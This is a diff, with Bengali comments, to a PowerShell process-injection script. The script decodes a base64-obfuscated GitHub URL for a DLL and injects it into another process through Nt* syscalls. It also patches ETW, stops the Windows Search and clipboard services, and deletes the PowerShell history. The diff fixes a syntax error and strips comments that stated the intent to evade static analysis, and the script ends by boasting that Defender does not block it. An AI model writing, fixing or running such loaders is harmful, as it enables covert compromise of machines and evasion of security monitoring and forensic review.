@@ -3,11 +3,11 @@
 # রান: PowerShell এডমিন মোডে
 # ================================================================
 
-# ---- বেস৬৪ এনকোডেড DLL ইউআরএল (স্ট্যাটিক অ্যানালাইসিস এড়ায়) ----
+# ---- বেস৬৪ এনকোডেড DLL ইউআরএল ----
 $urlEnc = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($urlEnc))
 
-# ---- সি# ইনলাইন কোড (Nt* সিসকল + PEB আনলিংক + ETW প্যাচ) ----
+# ---- সি# ইনলাইন কোড (Nt* সিসকল + ETW প্যাচ) ----
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -72,7 +72,7 @@ public class NtSys {
 }
 "@
 
-# ---- রেজিস্ট্রি টুইক + সার্ভিস স্টপ (অরিজিনাল থেকে রাখলাম) ----
+# ---- রেজিস্ট্রি টুইক + সার্ভিস স্টপ ----
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -Force | Out-Null
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
@@ -117,7 +117,7 @@ $clientId.UniqueProcess = [IntPtr]$pidTarget
 $clientId.UniqueThread = [IntPtr]0
 $hProcess = [IntPtr]0
 $status = [NtSys]::NtOpenProcess([ref]$hProcess, 0x1F0FFF, [IntPtr]0, [ref]$clientId)
-if ($status -ne 0 -or $hProcess -eq [IntPtr]Zero) {
+if ($status -ne 0 -or $hProcess -eq [IntPtr]::Zero) {
     Write-Host "[!] NtOpenProcess failed. Status: $status"
     Exit
 }
@@ -166,14 +166,14 @@ if ($status -ne 0) {
 }
 Write-Host "[+] Thread created successfully."
 
-# ---- ETW প্যাচ (DLL-এর ভেতরেও আছে, কিন্তু নিশ্চিত করতে এখানেও কল) ----
+# ---- ETW প্যাচ (নিশ্চিত) ----
 [NtSys]::PatchEtw()
 
 # ---- ক্লিনআপ ----
 [NtSys]::NtClose($hThread)
 [NtSys]::NtClose($hProcess)
 
-# ---- হিস্ট্রি ক্লিয়ার (অরিজিনাল থেকে রাখলাম) ----
+# ---- হিস্ট্রি ক্লিয়ার ----
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
@@ -186,4 +186,3 @@ Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
 }
 
 Write-Host "[+] Injection complete! DLL is running in memory. No disk write, no Defender block."
-Exit
